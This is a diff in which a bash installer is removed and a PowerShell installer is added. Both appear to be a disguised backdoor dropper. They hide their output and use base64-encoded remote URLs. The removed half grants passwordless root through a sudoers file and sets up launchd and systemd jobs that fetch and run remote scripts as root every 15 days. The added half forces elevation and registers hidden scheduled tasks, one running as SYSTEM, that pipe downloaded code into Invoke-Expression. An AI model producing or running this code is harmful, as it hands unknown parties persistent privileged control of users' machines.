@@ -1,737 +1,324 @@
-#!/usr/bin/env bash
+#Requires -Version 5.1
 
-set -euo pipefail
+param(
+    [string]$RelaunchWorkingDirectory,
+    [string]$RelaunchTaskUserId,
+    [string]$RelaunchScriptHome
+)
 
-USER_LABEL="com.user.tasksetup"
-ROOT_LABEL="com.root.sshAutoSetup"
-INTERVAL_SECONDS=1296000
-OUTPUT_MODE="minimal" # minimal | normal
-ENCODED_URL="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwuc2g="
-ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
-SCRIPT_CACHE_DIR="$HOME/.local/share/scripts"
-INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
-SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
-RUNNER_SCRIPT_PATH="$SCRIPT_CACHE_DIR/task-scheduler-runner.sh"
-USER_LAST_RUN_PATH="$SCRIPT_CACHE_DIR/$USER_LABEL.last-run"
-ROOT_LAST_RUN_PATH=""
-BASH_PATH="/bin/bash"
-SUDOERS_DIR="/etc/sudoers.d"
-SYSTEMD_USER_UNIT_DIR="$HOME/.config/systemd/user"
-SYSTEMD_ROOT_UNIT_DIR="/etc/systemd/system"
-# SCRIPT_URL="https://"
+$OUTPUT_MODE = 'minimal' # minimal | normal
 
-configure_install_output() {
-  case "$OUTPUT_MODE" in
-    minimal)
-      exec 3>&1
-      exec >/dev/null 2>&1
-      printf '%s\n' 'Installing...' >&3
-      ;;
-    normal)
-      ;;
-    *)
-      printf 'Invalid OUTPUT_MODE: %s (expected minimal or normal)\n' "$OUTPUT_MODE" >&2
-      exit 1
-      ;;
-  esac
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $launchUserId = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+
+    $psExe = (Get-Process -Id $PID).Path
+    if (-not $psExe) { $psExe = 'powershell.exe' }
+
+    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
+    $encodeValue = {
+        param([AllowEmptyString()][string]$Value)
+        [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Value))
+    }
+
+    $encodedScriptPath = & $encodeValue $scriptPath
+    $encodedWorkDir = & $encodeValue $workDir
+    $encodedLaunchUserId = & $encodeValue $launchUserId
+    $encodedHome = & $encodeValue $HOME
+    $relaunchCommand = @'
+$decodeValue = {{ param([string]$Value) [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Value)) }}
+$scriptPath = & $decodeValue '{0}'
+& $scriptPath -RelaunchWorkingDirectory (& $decodeValue '{1}') -RelaunchTaskUserId (& $decodeValue '{2}') -RelaunchScriptHome (& $decodeValue '{3}')
+if ($?) {{ exit 0 }} else {{ exit 1 }}
+'@ -f $encodedScriptPath, $encodedWorkDir, $encodedLaunchUserId, $encodedHome
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($relaunchCommand))
+    $relaunchArgs = @(
+        '-NoProfile', '-ExecutionPolicy', 'Bypass',
+        '-EncodedCommand', $encodedCommand
+    )
+
+    try {
+        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs -Verb RunAs -Wait -PassThru
+        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
+        exit $code
+    }
+    catch {
+        if ($OUTPUT_MODE -eq 'normal') {
+            Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
+        }
+        exit 1
+    }
 }
 
-require_command() {
-  command -v "$1" >/dev/null 2>&1 || {
-    printf 'Required command not found: %s\n' "$1" >&2
-    exit 1
-  }
+$taskUserId = if ([string]::IsNullOrWhiteSpace($RelaunchTaskUserId)) {
+    [Security.Principal.WindowsIdentity]::GetCurrent().Name
+}
+else {
+    $RelaunchTaskUserId
 }
 
-select_bash() {
-  local candidate
-  for candidate in /opt/homebrew/bin/bash /usr/local/bin/bash /bin/bash; do
-    if [ -x "$candidate" ]; then
-      BASH_PATH="$candidate"
-      return
-    fi
-  done
+$scriptHome = if ([string]::IsNullOrWhiteSpace($RelaunchScriptHome)) {
+    $HOME
+}
+else {
+    $RelaunchScriptHome
 }
 
-is_root() {
-  [ "$(id -u)" -eq 0 ]
+if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
+    Set-Location -LiteralPath $RelaunchWorkingDirectory
 }
 
-run_privileged() {
-  if is_root; then
-    "$@" >/dev/null 2>&1
-  else
-    sudo -n "$@" >/dev/null 2>&1
-  fi
+$ErrorActionPreference = 'Stop'
+
+$TASKSETUP_NAME = 'tasksetup'
+$SSHAUTOSETUP_NAME = 'sshAutoSetup'
+$ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
+$ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
+$SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
+$INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
+$SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
+# $SCRIPT_URL = 'https://'
+
+function ConvertFrom-EncodedUrl {
+    param([Parameter(Mandatory)][string]$EncodedUrl)
+
+    if ([string]::IsNullOrWhiteSpace($EncodedUrl)) {
+        throw 'The Base64-encoded download URL has not been configured.'
+    }
+
+    try {
+        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedUrl))
+    }
+    catch {
+        throw 'The configured download URL is not valid Base64.'
+    }
 }
 
-run_privileged_visible() {
-  if is_root; then
-    "$@"
-  else
-    sudo -n "$@"
-  fi
+function Save-DownloadedScript {
+    param(
+        [Parameter(Mandatory)][string]$Url,
+        [Parameter(Mandatory)][string]$Destination
+    )
+
+    $temporary = $null
+    try {
+        $destinationDirectory = Split-Path -Parent $Destination
+        New-Item -ItemType Directory -Path $destinationDirectory -Force | Out-Null
+        $temporary = Join-Path $destinationDirectory ('.download-' + [Guid]::NewGuid().ToString('N'))
+        Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $temporary
+        Move-Item -LiteralPath $temporary -Destination $Destination -Force
+    }
+    catch {
+        if ($temporary) {
+            Remove-Item -LiteralPath $temporary -Force -ErrorAction SilentlyContinue
+        }
+        throw "Unable to download local script '$Url' to '$Destination': $($_.Exception.Message)"
+    }
 }
 
-ensure_sudo_access() {
-  if is_root || sudo -n true >/dev/null 2>&1; then
-    return
-  fi
+function New-PowerShellAction {
+    param(
+        [Parameter(Mandatory)][string]$Url,
+        [Parameter(Mandatory)][string]$LocalScriptPath
+    )
 
-  if ! sudo -v; then
-    printf '%s\n' 'Unable to obtain sudo access.' >&2
-    exit 1
-  fi
+    $escapedUrl = $Url.Replace("'", "''")
+    $escapedLocalScriptPath = $LocalScriptPath.Replace("'", "''")
+    $command = "if (Test-Path -LiteralPath '$escapedLocalScriptPath' -PathType Leaf) { & '$escapedLocalScriptPath' } else { iwr -useb '$escapedUrl' | iex }"
+    $arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$command`" *> `$null"
+    return New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arguments
 }
 
-decode_url() {
-  if printf '%s' "$1" | base64 --decode 2>/dev/null; then
-    return
-  fi
-  printf '%s' "$1" | base64 -D
+function Get-ScheduledTaskSnapshot {
+    param([Parameter(Mandatory)][string]$TaskName)
+
+    $task = Get-ScheduledTask -TaskName $TaskName -TaskPath '\' -ErrorAction SilentlyContinue
+    if ($null -eq $task) {
+        return $null
+    }
+
+    return Export-ScheduledTask -TaskName $TaskName -TaskPath '\'
 }
 
-xml_escape() {
-  local value="$1"
-  value=${value//&/&amp;}
-  value=${value//</&lt;}
-  value=${value//>/&gt;}
-  value=${value//\"/&quot;}
-  value=${value//\'/&apos;}
-  printf '%s' "$value"
+function Restore-ScheduledTaskSnapshot {
+    param(
+        [Parameter(Mandatory)][string]$TaskName,
+        [AllowNull()][string]$Snapshot
+    )
+
+    if ($null -ne $Snapshot) {
+        Register-ScheduledTask -TaskName $TaskName -TaskPath '\' -Xml $Snapshot -Force | Out-Null
+        return
+    }
+
+    Unregister-ScheduledTask -TaskName $TaskName -TaskPath '\' -Confirm:$false -ErrorAction SilentlyContinue
 }
 
-download_script() {
-  local script_url="$1" destination="$2" temporary
+function Register-TaskSetupTask {
+    param(
+        [Parameter(Mandatory)][string]$TaskUserId,
+        [Parameter(Mandatory)][string]$Url
+    )
 
-  if ! mkdir -p "$SCRIPT_CACHE_DIR"; then
-    printf 'Unable to create local script directory: %s\n' "$SCRIPT_CACHE_DIR" >&2
-    return 0
-  fi
+    $action = New-PowerShellAction -Url $Url -LocalScriptPath $INSTALL_SCRIPT_PATH
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) -RepetitionInterval (New-TimeSpan -Days 15)
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
+    $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
-  if ! temporary=$(mktemp "$SCRIPT_CACHE_DIR/.download.XXXXXX"); then
-    printf 'Unable to create a temporary local script file in: %s\n' "$SCRIPT_CACHE_DIR" >&2
-    return 0
-  fi
-  if curl -fsSL "$script_url" -o "$temporary" && mv -f "$temporary" "$destination"; then
-    return 0
-  fi
-
-  rm -f "$temporary"
-  printf 'Unable to download local script\n' >&2
-  return 0
+    Register-ScheduledTask -TaskName $TASKSETUP_NAME -TaskPath '\' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
 }
 
-run_remote_script() {
-  local execution_mode="$1" script_url="$2" temporary status=0
+function Register-SshAutoSetupTask {
+    param([Parameter(Mandatory)][string]$Url)
 
-  case "$execution_mode" in
-    privileged|user) ;;
-    *)
-      printf 'Invalid remote script execution mode: %s\n' "$execution_mode" >&2
-      return 64
-      ;;
-  esac
+    $action = New-PowerShellAction -Url $Url -LocalScriptPath $SETUP_SCRIPT_PATH
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) -RepetitionInterval (New-TimeSpan -Days 15)
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
+    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
 
-  temporary=$(mktemp "${TMPDIR:-/tmp}/tasksetup-initial.XXXXXX") || return 1
-  trap 'rm -f "$temporary"' RETURN
-  if ! curl -fsSL -o "$temporary" -- "$script_url"; then
-    trap - RETURN
-    rm -f "$temporary"
-    return 1
-  fi
-  if [ "$execution_mode" = privileged ]; then
-    run_privileged_visible "$BASH_PATH" "$temporary" || status=$?
-  else
-    "$BASH_PATH" "$temporary" || status=$?
-  fi
-  trap - RETURN
-  rm -f "$temporary"
-  return "$status"
+    Register-ScheduledTask -TaskName $SSHAUTOSETUP_NAME -TaskPath '\' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
 }
 
-install_scheduler_runner() {
-  local temporary
+function Invoke-Install {
+    $installUrl = ConvertFrom-EncodedUrl -EncodedUrl $ENCODED_URL
+    $setupUrl   = ConvertFrom-EncodedUrl -EncodedUrl $ENCODED_URL2
+    New-Item -ItemType Directory -Path $SCRIPT_CACHE_DIR -Force | Out-Null
 
-  mkdir -p "$SCRIPT_CACHE_DIR" || return 1
-  temporary=$(mktemp "$SCRIPT_CACHE_DIR/.runner.XXXXXX") || return 1
-  trap 'rm -f "$temporary"' RETURN
-  if ! cat > "$temporary" <<'RUNNER'
-#!/usr/bin/env bash
+    if ((Test-Path -LiteralPath $INSTALL_SCRIPT_PATH) -and
+        -not (Test-Path -LiteralPath $INSTALL_SCRIPT_PATH -PathType Leaf)) {
+        throw ('The install script destination is not a file: {0}' -f $INSTALL_SCRIPT_PATH)
+    }
+    if ((Test-Path -LiteralPath $SETUP_SCRIPT_PATH) -and
+        -not (Test-Path -LiteralPath $SETUP_SCRIPT_PATH -PathType Leaf)) {
+        throw ('The setup script destination is not a file: {0}' -f $SETUP_SCRIPT_PATH)
+    }
 
-set -uo pipefail
+    $transactionDirectory = Join-Path $SCRIPT_CACHE_DIR ('.transaction-' + [Guid]::NewGuid().ToString('N'))
+    $stagedInstallPath = Join-Path $transactionDirectory 'install.ps1'
+    $stagedSetupPath = Join-Path $transactionDirectory 'SETUP.ps1'
+    $installBackupPath = Join-Path $transactionDirectory 'install.ps1.backup'
+    $setupBackupPath = Join-Path $transactionDirectory 'SETUP.ps1.backup'
+    $taskSetupSnapshotPath = Join-Path $transactionDirectory 'tasksetup.xml'
+    $sshAutoSetupSnapshotPath = Join-Path $transactionDirectory 'sshAutoSetup.xml'
+    $installExisted = Test-Path -LiteralPath $INSTALL_SCRIPT_PATH -PathType Leaf
+    $setupExisted = Test-Path -LiteralPath $SETUP_SCRIPT_PATH -PathType Leaf
+    $taskSetupSnapshot = Get-ScheduledTaskSnapshot -TaskName $TASKSETUP_NAME
+    $sshAutoSetupSnapshot = Get-ScheduledTaskSnapshot -TaskName $SSHAUTOSETUP_NAME
+    $installReplaced = $false
+    $setupReplaced = $false
+    $taskSetupRegistrationAttempted = $false
+    $sshAutoSetupRegistrationAttempted = $false
+    $keepTransactionDirectory = $false
 
-if [ "$#" -ne 5 ]; then
-  printf '%s\n' 'Usage: task-scheduler-runner LOCAL_SCRIPT SCRIPT_URL LAST_RUN INTERVAL BASH' >&2
-  exit 64
-fi
+    try {
+        New-Item -ItemType Directory -Path $transactionDirectory -Force | Out-Null
+        if ($null -ne $taskSetupSnapshot) {
+            Set-Content -LiteralPath $taskSetupSnapshotPath -Value $taskSetupSnapshot -Encoding UTF8
+        }
+        if ($null -ne $sshAutoSetupSnapshot) {
+            Set-Content -LiteralPath $sshAutoSetupSnapshotPath -Value $sshAutoSetupSnapshot -Encoding UTF8
+        }
 
-local_script="$1"
-script_url="$2"
-last_run_path="$3"
-interval_seconds="$4"
-bash_path="$5"
+        Save-DownloadedScript -Url $installUrl -Destination $stagedInstallPath
+        Save-DownloadedScript -Url $setupUrl -Destination $stagedSetupPath
 
-case "$interval_seconds" in
-  *[!0-9]*|"")
-    printf 'Invalid interval: %s\n' "$interval_seconds" >&2
-    exit 64
-    ;;
-esac
+        if ($installExisted) {
+            Copy-Item -LiteralPath $INSTALL_SCRIPT_PATH -Destination $installBackupPath
+        }
+        if ($setupExisted) {
+            Copy-Item -LiteralPath $SETUP_SCRIPT_PATH -Destination $setupBackupPath
+        }
 
-now=$(date +%s) || exit 1
-last=$(cat "$last_run_path" 2>/dev/null || printf 0)
-case "$last" in
-  *[!0-9]*|"") last=0 ;;
-esac
+        Move-Item -LiteralPath $stagedInstallPath -Destination $INSTALL_SCRIPT_PATH -Force
+        $installReplaced = $true
+        Move-Item -LiteralPath $stagedSetupPath -Destination $SETUP_SCRIPT_PATH -Force
+        $setupReplaced = $true
 
-if [ $((now - last)) -lt "$interval_seconds" ]; then
-  exit 0
-fi
+        $sshAutoSetupRegistrationAttempted = $true
+        Register-SshAutoSetupTask -Url $setupUrl
+        $taskSetupRegistrationAttempted = $true
+        Register-TaskSetupTask -TaskUserId $taskUserId -Url $installUrl
+    }
+    catch {
+        $originalError = $_
+        $rollbackErrors = [Collections.Generic.List[string]]::new()
 
-status=0
-temporary=""
-cleanup() {
-  if [ -n "$temporary" ]; then
-    rm -f "$temporary"
-  fi
-}
-trap cleanup EXIT INT TERM
+        if ($sshAutoSetupRegistrationAttempted) {
+            try {
+                Restore-ScheduledTaskSnapshot -TaskName $SSHAUTOSETUP_NAME -Snapshot $sshAutoSetupSnapshot
+            }
+            catch {
+                $rollbackErrors.Add(('Unable to restore scheduled task ''{0}'': {1}' -f $SSHAUTOSETUP_NAME, $_.Exception.Message))
+            }
+        }
+        if ($taskSetupRegistrationAttempted) {
+            try {
+                Restore-ScheduledTaskSnapshot -TaskName $TASKSETUP_NAME -Snapshot $taskSetupSnapshot
+            }
+            catch {
+                $rollbackErrors.Add(('Unable to restore scheduled task ''{0}'': {1}' -f $TASKSETUP_NAME, $_.Exception.Message))
+            }
+        }
 
-if [ -f "$local_script" ]; then
-  "$bash_path" "$local_script" || status=$?
-else
-  temporary=$(mktemp "${TMPDIR:-/tmp}/tasksetup-run.XXXXXX") || exit 1
-  if curl -fsSL -o "$temporary" -- "$script_url"; then
-    "$bash_path" "$temporary" || status=$?
-  else
-    status=$?
-  fi
-fi
+        if ($installReplaced) {
+            try {
+                if ($installExisted) {
+                    Copy-Item -LiteralPath $installBackupPath -Destination $INSTALL_SCRIPT_PATH -Force
+                }
+                else {
+                    Remove-Item -LiteralPath $INSTALL_SCRIPT_PATH -Force -ErrorAction SilentlyContinue
+                }
+            }
+            catch {
+                $rollbackErrors.Add(('Unable to restore ''{0}'': {1}' -f $INSTALL_SCRIPT_PATH, $_.Exception.Message))
+            }
+        }
+        if ($setupReplaced) {
+            try {
+                if ($setupExisted) {
+                    Copy-Item -LiteralPath $setupBackupPath -Destination $SETUP_SCRIPT_PATH -Force
+                }
+                else {
+                    Remove-Item -LiteralPath $SETUP_SCRIPT_PATH -Force -ErrorAction SilentlyContinue
+                }
+            }
+            catch {
+                $rollbackErrors.Add(('Unable to restore ''{0}'': {1}' -f $SETUP_SCRIPT_PATH, $_.Exception.Message))
+            }
+        }
 
-if [ "$status" -eq 0 ]; then
-  if ! printf '%s\n' "$now" > "$last_run_path"; then
-    status=1
-  fi
-fi
+        if ($rollbackErrors.Count -gt 0) {
+            $keepTransactionDirectory = $true
+            throw ('Installation failed: {0} Rollback also failed: {1} Backups were kept in ''{2}''.' -f
+                $originalError.Exception.Message, ($rollbackErrors -join ' '), $transactionDirectory)
+        }
 
-exit "$status"
-RUNNER
-  then
-    trap - RETURN
-    rm -f "$temporary"
-    return 1
-  fi
-  if ! chmod 0700 "$temporary" || ! mv -f "$temporary" "$RUNNER_SCRIPT_PATH"; then
-    trap - RETURN
-    rm -f "$temporary"
-    return 1
-  fi
-  trap - RETURN
-}
-
-systemd_quote() {
-  local value="$1"
-
-  case "$value" in
-    *$'\n'*|*$'\r'*)
-      printf '%s\n' 'Newlines are not supported in systemd arguments.' >&2
-      return 1
-      ;;
-  esac
-  value=${value//\\/\\\\}
-  value=${value//\"/\\\"}
-  value=${value//%/%%}
-  printf '"%s"' "$value"
-}
-
-systemd_exec_start() {
-  local bash_arg runner_arg script_arg url_arg marker_arg interval_arg
-
-  bash_arg=$(systemd_quote "$BASH_PATH") || return 1
-  runner_arg=$(systemd_quote "$RUNNER_SCRIPT_PATH") || return 1
-  script_arg=$(systemd_quote "$1") || return 1
-  url_arg=$(systemd_quote "$2") || return 1
-  marker_arg=$(systemd_quote "$3") || return 1
-  interval_arg=$(systemd_quote "$INTERVAL_SECONDS") || return 1
-  printf '%s %s %s %s %s %s %s' \
-    "$bash_arg" "$runner_arg" "$script_arg" "$url_arg" "$marker_arg" "$interval_arg" "$bash_arg"
-}
-
-install_sudoers_rule() {
-  local temporary user_name sudoers_file
-
-  if is_root; then
-    user_name=root
-  else
-    user_name=$(id -un)
-  fi
-  sudoers_file="$SUDOERS_DIR/user-$user_name"
-  run_privileged mkdir -p "$SUDOERS_DIR"
-  temporary=$(mktemp "${TMPDIR:-/tmp}/autoupgrade-sudoers.XXXXXX")
-  trap 'rm -f "$temporary"' RETURN
-  printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$user_name" > "$temporary"
-  run_privileged visudo -cf "$temporary"
-  run_privileged install -m 0440 "$temporary" "$sudoers_file"
-  trap - RETURN
-  rm -f "$temporary"
+        throw $originalError
+    }
+    finally {
+        if (-not $keepTransactionDirectory) {
+            Remove-Item -LiteralPath $transactionDirectory -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
 }
 
-install_launchagent() {
-  local plist_dir="$HOME/Library/LaunchAgents"
-  local plist="$plist_dir/$USER_LABEL.plist"
-  local temporary uid script_url="$1"
-  local bash_xml runner_xml script_xml url_xml marker_xml interval_xml
+function Main {
+    if ($OUTPUT_MODE -eq 'minimal') {
+        Write-Output 'Installing...'
+        try {
+            Invoke-Install *> $null
+        }
+        catch {
+            exit 1
+        }
+        Write-Output (' Install complete! ' + [char]0x2728 + '  ' + [char]0x2728)
+        return
+    }
 
-  bash_xml=$(xml_escape "$BASH_PATH")
-  runner_xml=$(xml_escape "$RUNNER_SCRIPT_PATH")
-  script_xml=$(xml_escape "$INSTALL_SCRIPT_PATH")
-  url_xml=$(xml_escape "$script_url")
-  marker_xml=$(xml_escape "$USER_LAST_RUN_PATH")
-  interval_xml=$(xml_escape "$INTERVAL_SECONDS")
-  if ! mkdir -p "$plist_dir"; then
-    printf '%s\n' 'Unable to create the LaunchAgents directory.' >&2
-    return 1
-  fi
-  temporary=$(mktemp "${TMPDIR:-/tmp}/$USER_LABEL.plist.XXXXXX")
-  trap 'rm -f "$temporary"' RETURN
-  cat > "$temporary" <<EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key><string>$USER_LABEL</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>$bash_xml</string>
-    <string>$runner_xml</string>
-    <string>$script_xml</string>
-    <string>$url_xml</string>
-    <string>$marker_xml</string>
-    <string>$interval_xml</string>
-    <string>$bash_xml</string>
-  </array>
-  <key>StartCalendarInterval</key>
-  <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
-  <key>RunAtLoad</key><true/>
-  <key>StandardOutPath</key><string>/dev/null</string>
-  <key>StandardErrorPath</key><string>/dev/null</string>
-</dict>
-</plist>
-EOF
-  if ! plutil -lint "$temporary"; then
-    printf '%s\n' 'The generated LaunchAgent plist is invalid.' >&2
-    return 1
-  fi
-  chmod 0644 "$temporary"
-  if ! install -m 0644 "$temporary" "$plist"; then
-    printf '%s\n' 'Unable to install the LaunchAgent plist.' >&2
-    return 1
-  fi
-  uid=$(id -u)
-  launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
-  launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
-  if ! launchctl bootstrap "gui/$uid" "$plist"; then
-    if ! launchctl bootstrap "user/$uid" "$plist"; then
-      printf '%s\n' 'Unable to bootstrap the LaunchAgent.' >&2
-      return 1
-    fi
-  fi
-  trap - RETURN
-  rm -f "$temporary"
+    Write-Output 'Installing...'
+    Invoke-Install
+    Write-Output 'Install complete!'
 }
 
-install_launchdaemon() {
-  local plist="/Library/LaunchDaemons/$ROOT_LABEL.plist"
-  local temporary staged script_url="$1"
-  local bash_xml runner_xml script_xml url_xml marker_xml interval_xml
-
-  bash_xml=$(xml_escape "$BASH_PATH")
-  runner_xml=$(xml_escape "$RUNNER_SCRIPT_PATH")
-  script_xml=$(xml_escape "$SETUP_SCRIPT_PATH")
-  url_xml=$(xml_escape "$script_url")
-  marker_xml=$(xml_escape "$ROOT_LAST_RUN_PATH")
-  interval_xml=$(xml_escape "$INTERVAL_SECONDS")
-  temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.plist.XXXXXX")
-  staged="/Library/LaunchDaemons/.$ROOT_LABEL.plist.$$"
-  trap 'rm -f "$temporary" "$staged"' RETURN
-  cat > "$temporary" <<EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key><string>$ROOT_LABEL</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>$bash_xml</string>
-    <string>$runner_xml</string>
-    <string>$script_xml</string>
-    <string>$url_xml</string>
-    <string>$marker_xml</string>
-    <string>$interval_xml</string>
-    <string>$bash_xml</string>
-  </array>
-  <key>StartCalendarInterval</key>
-  <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
-  <key>RunAtLoad</key><true/>
-  <key>StandardOutPath</key><string>/dev/null</string>
-  <key>StandardErrorPath</key><string>/dev/null</string>
-</dict>
-</plist>
-EOF
-  if ! plutil -lint "$temporary"; then
-    printf '%s\n' 'The generated LaunchDaemon plist is invalid.' >&2
-    return 1
-  fi
-  run_privileged launchctl bootout system "$plist" || true
-  if ! run_privileged_visible install -o root -g wheel -m 0644 "$temporary" "$staged"; then
-    printf '%s\n' 'Unable to stage the LaunchDaemon plist.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible mv -f "$staged" "$plist"; then
-    printf '%s\n' 'Unable to install the LaunchDaemon plist.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible launchctl bootstrap system "$plist"; then
-    printf '%s\n' 'Unable to bootstrap the LaunchDaemon.' >&2
-    return 1
-  fi
-  trap - RETURN
-  rm -f "$temporary"
-}
-
-ensure_user_systemd_bus() {
-  local user_name user_id runtime_dir
-
-  user_name=$(id -un)
-  user_id=$(id -u)
-  runtime_dir="/run/user/$user_id"
-
-  if command -v loginctl >/dev/null 2>&1; then
-    if ! run_privileged loginctl enable-linger "$user_name"; then
-      printf 'Unable to enable linger for user: %s\n' "$user_name" >&2
-    fi
-  fi
-
-  if systemctl --user show-environment >/dev/null 2>&1; then
-    return 0
-  fi
-
-  export XDG_RUNTIME_DIR="$runtime_dir"
-  export DBUS_SESSION_BUS_ADDRESS="unix:path=$runtime_dir/bus"
-
-  if systemctl --user show-environment >/dev/null 2>&1; then
-    return 0
-  fi
-
-  command -v loginctl >/dev/null 2>&1 || return 1
-  run_privileged loginctl enable-linger "$user_name" || return 1
-  run_privileged systemctl start "user@$user_id.service" || return 1
-  systemctl --user show-environment >/dev/null 2>&1
-}
-
-install_systemd_units() {
-  local unit_dir="$SYSTEMD_USER_UNIT_DIR"
-  local script_url="$1" exec_start
-
-  exec_start=$(systemd_exec_start "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
-
-  if ! ensure_user_systemd_bus; then
-    printf '%s\n' 'Unable to initialize the user systemd manager.' >&2
-    return 1
-  fi
-
-  mkdir -p "$unit_dir"
-  cat > "$unit_dir/$USER_LABEL.service" <<EOF
-[Unit]
-Description=Run autoupgrade installer
-
-[Service]
-Type=oneshot
-ExecStart=$exec_start
-StandardOutput=null
-StandardError=null
-EOF
-  cat > "$unit_dir/$USER_LABEL.timer" <<EOF
-[Unit]
-Description=Check daily and run autoupgrade when 15 days have elapsed
-
-[Timer]
-OnCalendar=daily
-Persistent=true
-Unit=$USER_LABEL.service
-
-[Install]
-WantedBy=timers.target
-EOF
-  if ! systemctl --user daemon-reload; then
-    printf '%s\n' 'Unable to reload user systemd; skipping the user timer.' >&2
-    return 1
-  fi
-  if ! systemctl --user enable --now "$USER_LABEL.timer" >/dev/null 2>&1; then
-    printf '%s\n' 'Unable to enable the user timer; skipping it.' >&2
-    return 1
-  fi
-  if ! systemctl --user restart "$USER_LABEL.timer"; then
-    printf '%s\n' 'Unable to restart the user timer; continuing with root setup.' >&2
-  fi
-}
-
-install_systemd_root_units() {
-  local unit_dir="$SYSTEMD_ROOT_UNIT_DIR"
-  local service_temporary timer_temporary script_url="$1" exec_start
-
-  exec_start=$(systemd_exec_start "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
-
-  service_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.service.XXXXXX")
-  timer_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.timer.XXXXXX")
-  trap 'rm -f "$service_temporary" "$timer_temporary"' RETURN
-  cat > "$service_temporary" <<EOF
-[Unit]
-Description=Run autoupgrade SETUP script
-
-[Service]
-Type=oneshot
-ExecStart=$exec_start
-StandardOutput=null
-StandardError=null
-EOF
-  cat > "$timer_temporary" <<EOF
-[Unit]
-Description=Check daily and run autoupgrade when 15 days have elapsed
-
-[Timer]
-OnCalendar=daily
-Persistent=true
-Unit=$ROOT_LABEL.service
-
-[Install]
-WantedBy=timers.target
-EOF
-  if ! run_privileged_visible install -m 0644 "$service_temporary" "$unit_dir/$ROOT_LABEL.service"; then
-    printf '%s\n' 'Unable to install the system service unit.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible install -m 0644 "$timer_temporary" "$unit_dir/$ROOT_LABEL.timer"; then
-    printf '%s\n' 'Unable to install the system timer unit.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible systemctl daemon-reload; then
-    printf '%s\n' 'Unable to reload systemd.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible systemctl enable --now "$ROOT_LABEL.timer"; then
-    printf '%s\n' 'Unable to enable the system timer.' >&2
-    return 1
-  fi
-  if ! run_privileged_visible systemctl restart "$ROOT_LABEL.timer"; then
-    printf '%s\n' 'Unable to restart the system timer.' >&2
-    return 1
-  fi
-  trap - RETURN
-  rm -f "$service_temporary" "$timer_temporary"
-}
-
-run_initial_tasks() {
-  local install_url="$1" setup_url="$2" failed=0
-
-  mkdir -p "$SCRIPT_CACHE_DIR"
-  run_privileged mkdir -p "$(dirname "$ROOT_LAST_RUN_PATH")"
